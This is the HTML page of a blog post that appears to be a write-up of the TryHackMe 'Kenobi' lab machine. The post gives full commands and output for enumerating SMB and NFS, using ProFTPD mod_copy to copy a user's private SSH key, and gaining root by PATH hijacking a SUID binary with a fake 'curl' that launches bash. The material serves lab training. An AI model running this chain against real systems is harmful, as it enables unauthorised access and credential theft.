@@ -1,0 +1,695 @@
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>Kenobi | CTF write-up</title>
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css?v=39fc118784">
+
+    <link rel="shortcut icon" href="../favicon.png" type="image/png">
+    <link rel="canonical" href="index.html">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <link rel="amphtml" href="amp/index.html">
+    
+    <meta property="og:site_name" content="fr33s0ul">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Kenobi | CTF write-up">
+    <meta property="og:description" content="This todays CTF we will cover a Kenobi made by www.tryhackme.com the theme of the machine is star-wars  ...  Let's enumerate this machine and see what we're dealing with root@kali:~# nmap -sC -sV 10.10.68.87 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:36">
+    <meta property="og:url" content="http://localhost:2368/kenobi-ctf-write-up/">
+    <meta property="og:image" content="http://localhost:2368/content/images/2020/04/Animated-GIF-downsized_large.gif">
+    <meta property="article:published_time" content="2020-04-07T11:40:35.000Z">
+    <meta property="article:modified_time" content="2020-04-08T10:53:44.000Z">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Kenobi | CTF write-up">
+    <meta name="twitter:description" content="This todays CTF we will cover a Kenobi made by www.tryhackme.com the theme of the machine is star-wars  ...  Let's enumerate this machine and see what we're dealing with root@kali:~# nmap -sC -sV 10.10.68.87 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:36">
+    <meta name="twitter:url" content="http://localhost:2368/kenobi-ctf-write-up/">
+    <meta name="twitter:image" content="http://localhost:2368/content/images/2020/04/Animated-GIF-downsized_large.gif">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="fr33s0ul">
+    <meta name="twitter:site" content="@fr33soul_">
+    <meta name="twitter:creator" content="@fr33soul_">
+    <meta property="og:image:width" content="480">
+    <meta property="og:image:height" content="276">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "fr33s0ul",
+        "url": "http://localhost:2368/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": {
+                "@type": "ImageObject",
+                "url": "http://localhost:2368/content/images/2020/03/logo.gif",
+                "width": 300,
+                "height": 41
+            }
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "fr33s0ul",
+        "image": {
+            "@type": "ImageObject",
+            "url": "http://localhost:2368/content/images/2020/03/asdasd.gif",
+            "width": 600,
+            "height": 594
+        },
+        "url": "http://localhost:2368/author/fr33s0ul/",
+        "sameAs": [
+            "https://twitter.com/fr33soul_"
+        ]
+    },
+    "headline": "Kenobi | CTF write-up",
+    "url": "http://localhost:2368/kenobi-ctf-write-up/",
+    "datePublished": "2020-04-07T11:40:35.000Z",
+    "dateModified": "2020-04-08T10:53:44.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "http://localhost:2368/content/images/2020/04/Animated-GIF-downsized_large.gif",
+        "width": 480,
+        "height": 276
+    },
+    "description": "This todays CTF we will cover a Kenobi made by www.tryhackme.com the theme of\nthe machine is star-wars  ...\n\n [https://giphy.com/gifs/cat-star-wars-9gISqB3tncMmY]\n\nLet&#x27;s enumerate this machine and see what we&#x27;re dealing with\n\nroot@kali:~# nmap -sC -sV 10.10.68.87\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:36 UTC\nNmap scan report for ip-10-10-68-87.eu-west-1.compute.internal (10.10.68.87)\nHost is up (0.00093s latency).\nNot shown: 993 closed ports\nPORT     STATE SERVICE     VERSION\n2",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://localhost:2368/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 3.12">
+    <link rel="alternate" type="application/rss+xml" title="fr33s0ul" href="../rss/index.html">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-111725042-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-111725042-2');
+</script>
+
+</head>
+<body class="post-template">
+
+    <div class="site-wrapper">
+
+        
+
+<header class="site-header">
+    <div class="outer site-nav-main">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left-wrapper">
+        <div class="site-nav-left">
+                <a class="site-nav-logo" href="../"><img src="../content/images/size/w1000/2020/03/logo.gif" alt="fr33s0ul"></a>
+            <div class="site-nav-content">
+                    <ul class="nav" role="menu">
+    <li class="nav-home" role="menuitem"><a href="../">Home</a></li>
+    <li class="nav-whoami" role="menuitem"><a href="../whoami/">whoami</a></li>
+</ul>
+
+                    <span class="nav-post-title ">Kenobi | CTF write-up</span>
+            </div>
+        </div>
+    </div>
+    <div class="site-nav-right">
+            <div class="social-links">
+                    <a class="social-link social-link-tw" href="https://twitter.com/fr33soul_" title="Twitter" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"></path></svg>
+</a>
+            </div>
+                <a class="rss-button" href="https://feedly.com/i/subscription/feed/http://localhost:2368/rss/" title="RSS" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"></circle><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"></path></svg>
+</a>
+
+    </div>
+</nav>
+    </div>
+</div></header>
+
+
+<main id="site-main" class="site-main outer">
+    <div class="inner">
+
+        <article class="post-full post ">
+
+            <header class="post-full-header">
+
+
+                <h1 class="post-full-title">Kenobi | CTF write-up</h1>
+
+
+                <div class="post-full-byline">
+
+                    <section class="post-full-byline-content">
+
+                        <ul class="author-list">
+                            <li class="author-list-item">
+
+                                <div class="author-card">
+                                    <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
+                                    <div class="author-info">
+                                        <h2>fr33s0ul</h2>
+                                        <p>Read <a href="../author/fr33s0ul/">more posts</a> by this author.</p>
+                                    </div>
+                                </div>
+
+                                <a href="../author/fr33s0ul/" class="author-avatar">
+                                    <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
+                                </a>
+
+                            </li>
+                        </ul>
+
+                        <section class="post-full-byline-meta">
+                            <h4 class="author-name"><a href="../author/fr33s0ul/">fr33s0ul</a></h4>
+                            <div class="byline-meta-content">
+                                <time class="byline-meta-date" datetime="2020-04-07">7 Apr 2020</time>
+                                <span class="byline-reading-time"><span class="bull">•</span> 9 min read</span>
+                            </div>
+                        </section>
+
+                    </section>
+
+
+                </div>
+            </header>
+
+            <figure class="post-full-image">
+                <img srcset="../content/images/size/w300/2020/04/Animated-GIF-downsized_large.gif 300w,
+                           ../content/images/size/w600/2020/04/Animated-GIF-downsized_large.giff 600w,
+                          ../content/images/size/w1000/2020/04/Animated-GIF-downsized_large.gifif 1000w,
+                         ../content/images/size/w2000/2020/04/Animated-GIF-downsized_large.gifgif 2000w" sizes="(max-width: 800px) 400px,
+                        (max-width: 1170px) 1170px,
+                            2000px" src="../content/images/size/w2000/2020/04/Animated-GIF-downsized_large.gif" alt="Kenobi | CTF write-up">
+            </figure>
+
+            <section class="post-full-content">
+                <div class="post-content">
+                    <p>This todays CTF we will cover a Kenobi made by www.tryhackme.com the theme of the machine is star-wars  ...</p><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/9gISqB3tncMmY" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/cat-star-wars-9gISqB3tncMmY"></a></p><!--kg-card-end: html--><p>Let's enumerate this machine and see what we're dealing with</p><pre><code>root@kali:~# nmap -sC -sV 10.10.68.87
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:36 UTC
+Nmap scan report for ip-10-10-68-87.eu-west-1.compute.internal (10.10.68.87)
+Host is up (0.00093s latency).
+Not shown: 993 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         ProFTPD 1.3.5
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
+|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
+|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/admin.html
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100003  2,3,4       2049/udp   nfs
+|   100003  2,3,4       2049/udp6  nfs
+|   100005  1,2,3      39562/udp6  mountd
+|   100005  1,2,3      44287/udp   mountd
+|   100005  1,2,3      57415/tcp6  mountd
+|   100005  1,2,3      58933/tcp   mountd
+|   100021  1,3,4      42750/udp6  nlockmgr
+|   100021  1,3,4      45283/tcp6  nlockmgr
+|   100021  1,3,4      45523/tcp   nlockmgr
+|   100021  1,3,4      55170/udp   nlockmgr
+|   100227  2,3         2049/tcp   nfs_acl
+|   100227  2,3         2049/tcp6  nfs_acl
+|   100227  2,3         2049/udp   nfs_acl
+|_  100227  2,3         2049/udp6  nfs_acl
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)          
+2049/tcp open  nfs_acl     2-3 (RPC #100227)
+MAC Address: 02:8A:BF:E2:69:EE (Unknown)
+Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel        
+Host script results:
+|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
+|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: kenobi
+|   NetBIOS computer name: KENOBI\x00
+|   Domain name: \x00
+|   FQDN: kenobi
+|_  System time: 2020-04-07T06:36:48-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-04-07T11:36:48
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.60 seconds
+</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-07-at-12.41.57.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-07-at-12.54.46.png" class="kg-image"></figure><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/8McNH1aXZnVyE" width="480" height="258" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/its-a-trap-admiral-ackbar-8McNH1aXZnVyE"></a></p><!--kg-card-end: html--><pre><code>root@kali:~# gobuster dir -u http://10.10.68.87/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.68.87/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/04/07 11:43:04 Starting gobuster
+===============================================================
+/server-status (Status: 403)
+===============================================================
+2020/04/07 11:43:22 Finished
+===============================================================
+</code></pre><p>after trying to fuzz for some directories, we didn't find anything so we will keep enumerating until we find something, I will enumerate SMB in case there's anything shared publicly </p><pre><code>root@kali:~# nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.68.87
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:45 UTC
+Nmap scan report for ip-10-10-68-87.eu-west-1.compute.internal (10.10.68.87)
+Host is up (0.00017s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 02:8A:BF:E2:69:EE (Unknown)
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: guest
+|   \\10.10.68.87\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
+|     Users: 1
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.68.87\anonymous: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\home\kenobi\share
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.68.87\print$: 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: &lt;none&gt;
+|_    Current user access: &lt;none&gt;
+|_smb-enum-users: ERROR: Script execution failed (use -d to debug)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.09 seconds
+</code></pre><pre><code>root@kali:~# smbclient //10.10.68.87/anonymous
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Wed Sep  4 10:49:09 2019
+  ..                                  D        0  Wed Sep  4 10:56:07 2019
+  log.txt                             N    12237  Wed Sep  4 10:49:09 2019
+                9204224 blocks of size 1024. 6855348 blocks available
+smb: \&gt; </code></pre><p>Port 111 running the service <strong>rpcbind</strong>. This is just an server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.</p><p>In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.</p><pre><code>root@kali:~# nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.68.87
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:54 UTC
+Nmap scan report for ip-10-10-68-87.eu-west-1.compute.internal (10.10.68.87)
+Host is up (0.00025s latency).
+
+PORT    STATE SERVICE
+111/tcp open  rpcbind
+| nfs-ls: Volume /var
+|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
+| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
+| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
+| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
+| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
+| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
+| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
+| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
+| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
+| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
+| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
+| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
+|_
+| nfs-showmount: 
+|_  /var *
+| nfs-statfs: 
+|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
+|_  /var        9204224.0  1858288.0  6855340.0  22%   16.0T        32000
+MAC Address: 02:8A:BF:E2:69:EE (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
+</code></pre><p>Use netcat to connect to the machine on the FTP port. We can use searchsploit to find exploits for a particular software version, <strong>Searchsploit</strong> is basically just a command line search tool for exploit-db.com.</p><pre><code>root@kali:~# nc 10.10.68.87 21
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.68.87]
+SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa
+250 Copy successful</code></pre><p>You ought to have discovered an exploit from ProFtpd's mod_copy module. The mod_copy module actualizes SITE CPFR and SITE CPTO commands, which can be utilized to copy files/directories from one place to another on the server. Any unauthenticated client can use these commands to duplicate documents from any piece of the filesystem to a chosen directory. We realize that the FTP administration is running as the Kenobi user (from the document on the share) and a ssh key is generated for that user.</p><pre><code>root@kali:~# mkdir /mnt/kenobiNFS
+root@kali:~# mount 10.10.68.87:/var /mnt/kenobiNFS
+root@kali:~# cd /mnt/kenobiNFS/
+root@kali:/mnt/kenobiNFS# ls -la
+total 56
+drwxr-xr-x 14 root root    4096 Sep  4  2019 .
+drwxr-xr-x  3 root root    4096 Apr  7 12:00 ..
+drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
+drwxr-xr-x  9 root root    4096 Sep  4  2019 cache
+drwxrwxrwt  2 root root    4096 Sep  4  2019 crash
+drwxr-xr-x 40 root root    4096 Sep  4  2019 lib
+drwxrwsr-x  2 root staff   4096 Apr 12  2016 local
+lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -&gt; /run/lock
+drwxrwxr-x 10 root crontab 4096 Sep  4  2019 log
+drwxrwsr-x  2 root mail    4096 Feb 26  2019 mail
+drwxr-xr-x  2 root root    4096 Feb 26  2019 opt
+lrwxrwxrwx  1 root root       4 Sep  4  2019 run -&gt; /run
+drwxr-xr-x  2 root root    4096 Jan 29  2019 snap
+drwxr-xr-x  5 root root    4096 Sep  4  2019 spool
+drwxrwxrwt  6 root root    4096 Apr  7 11:59 tmp
+drwxr-xr-x  3 root root    4096 Sep  4  2019 www
+root@kali:/mnt/kenobiNFS#</code></pre><pre><code>root@kali:~# cp /mnt/kenobiNFS/tmp/id_rsa .
+root@kali:~# chmod 600 id_rsa 
+root@kali:~# ssh -i id_rsa kenobi@10.10.68.87
+The authenticity of host '10.10.68.87 (10.10.68.87)' can't be established.
+ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.68.87' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+103 packages can be updated.
+65 updates are security updates.
+
+
+Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
+To run a command as administrator (user "root"), use "sudo &lt;command&gt;".
+See "man sudo_root" for details.
+
+kenobi@kenobi:~$ </code></pre><p>and here we are ssh-ing to the kenobi user 😶</p><pre><code>kenobi@kenobi:~$ ls -la
+total 40
+drwxr-xr-x 5 kenobi kenobi 4096 Sep  4  2019 .
+drwxr-xr-x 3 root   root   4096 Sep  4  2019 ..
+lrwxrwxrwx 1 root   root      9 Sep  4  2019 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 kenobi kenobi  220 Sep  4  2019 .bash_logout
+-rw-r--r-- 1 kenobi kenobi 3771 Sep  4  2019 .bashrc
+drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .cache
+-rw-r--r-- 1 kenobi kenobi  655 Sep  4  2019 .profile
+drwxr-xr-x 2 kenobi kenobi 4096 Sep  4  2019 share
+drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .ssh
+-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt
+-rw------- 1 kenobi kenobi  642 Sep  4  2019 .viminfo
+kenobi@kenobi:~$ cat user.txt 
+xxxxxxxxxxxxxxxxxxxxxxxxxx224899
+kenobi@kenobi:~$ </code></pre><p>Time for some privilege escalation </p><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/l4Ho9Eed9XDNQ94k0" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/animation-design-illustration-l4Ho9Eed9XDNQ94k0"></a></p><!--kg-card-end: html--><pre><code>kenobi@kenobi:~$ find / -type f -perm -u=s 2&gt;/dev/null
+/sbin/mount.nfs
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/menu
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/newgrp
+/bin/umount
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+kenobi@kenobi:~$</code></pre><pre><code class="language-markup">kenobi@kenobi:~$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :3
+eth0      Link encap:Ethernet  HWaddr 02:8a:bf:e2:69:ee  
+          inet addr:10.10.68.87  Bcast:10.10.255.255  Mask:255.255.0.0
+          inet6 addr: fe80::8a:bfff:fee2:69ee/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
+          RX packets:266307 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:231976 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:35103632 (35.1 MB)  TX bytes:112553658 (112.5 MB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:190 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:190 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:14101 (14.1 KB)  TX bytes:14101 (14.1 KB)
+
+
+kenobi@kenobi:~$</code></pre><pre><code>kenobi@kenobi:/tmp$ echo /bin/bash &gt; curl 
+kenobi@kenobi:/tmp$ chmod +x curl
+kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
+kenobi@kenobi:/tmp$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+To run a command as administrator (user "root"), use "sudo &lt;command&gt;".
+See "man sudo_root" for details.
+
+root@kenobi:/tmp# id
+uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
+root@kenobi:/tmp# cat /root/
+.bash_history  .cache/        root.txt       
+.bashrc        .profile       .viminfo       
+root@kenobi:/tmp# cat /root/root.txt 
+**************************1f02
+root@kenobi:/tmp# 
+</code></pre><p>/usr/bin/menu runs as root it does curl server status and kernel version with uname or ifconfig, so i created a curl file and pushed to it a bin bash call gave it permission to be executable and exported the path were the file exists.</p><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/sQL9UPichyoFO" width="480" height="252" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/reaction-sQL9UPichyoFO"></a></p><!--kg-card-end: html--><p>Happy Hacking!</p>
+                </div>
+            </section>
+
+
+
+        </article>
+
+    </div>
+</main>
+
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+
+                <article class="post-card post ">
+
+    <a class="post-card-image-link" href="../jockerctf-write-up/">
+        <img class="post-card-image" srcset="../content/images/size/w300/2020/04/joker.jpg 300w,
+                   ../content/images/size/w600/2020/04/joker.jpg 600w,
+                  ../content/images/size/w1000/2020/04/joker.jpg 1000w,
+                 ../content/images/size/w2000/2020/04/joker.jpg 2000w" sizes="(max-width: 1000px) 400px, 700px" src="../content/images/size/w600/2020/04/joker.jpg" alt="JockerCTF | write-up">
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../jockerctf-write-up/">
+
+            <header class="post-card-header">
+                <h2 class="post-card-title">JockerCTF | write-up</h2>
+            </header>
+
+            <section class="post-card-excerpt">
+                    <p>Hello world, I hope you are all well and safe home from the pandemic, today's challenge is a CTF by Tryhackme is rated medium, but still it needs focus and</p>
+            </section>
+
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+            
+                    <div class="author-name-tooltip">
+                        fr33s0ul
+                    </div>
+            
+                    <a href="../author/fr33s0ul/" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="../author/fr33s0ul/">fr33s0ul</a></span>
+                <span class="post-card-byline-date"><time datetime="2020-04-07">7 Apr 2020</time> <span class="bull">•</span> 8 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+
+                <article class="post-card post ">
+
+    <a class="post-card-image-link" href="../toolsrus-ctf-write-up/">
+        <img class="post-card-image" srcset="../content/images/size/w300/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg 300w,
+                   ../content/images/size/w600/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg 600w,
+                  ../content/images/size/w1000/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg 1000w,
+                 ../content/images/size/w2000/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg 2000w" sizes="(max-width: 1000px) 400px, 700px" src="../content/images/size/w600/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg" alt="ToolsRus CTF | write-up">
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../toolsrus-ctf-write-up/">
+
+            <header class="post-card-header">
+                <h2 class="post-card-title">ToolsRus CTF | write-up</h2>
+            </header>
+
+            <section class="post-card-excerpt">
+                    <p>Hello all, todays challenge is made by Tryhackme.com, it's a fun CTF ratted as easy, totally straight forward. Let's enumerate the machine root@kali:~# nmap -sC -sV 10.10.</p>
+            </section>
+
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+            
+                    <div class="author-name-tooltip">
+                        fr33s0ul
+                    </div>
+            
+                    <a href="../author/fr33s0ul/" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="../author/fr33s0ul/">fr33s0ul</a></span>
+                <span class="post-card-byline-date"><time datetime="2020-04-03">3 Apr 2020</time> <span class="bull">•</span> 6 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+        </div>
+    </div>
+</aside>
+
+
+
+
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="../">fr33s0ul</a> © 2020</section>
+                <nav class="site-footer-nav">
+                    <a href="../">Latest Posts</a>
+                    
+                    <a href="https://twitter.com/fr33soul_" target="_blank" rel="noopener">Twitter</a>
+                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
+                </nav>
+            </div>
+        </footer>
+
+    </div>
+
+
+    <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous">
+    </script>
+    <script src="../assets/built/casper.js?v=39fc118784"></script>
+
+    <script>
+        // Parse the URL parameter
+        function getParameterByName(name, url) {
+            if (!url) url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
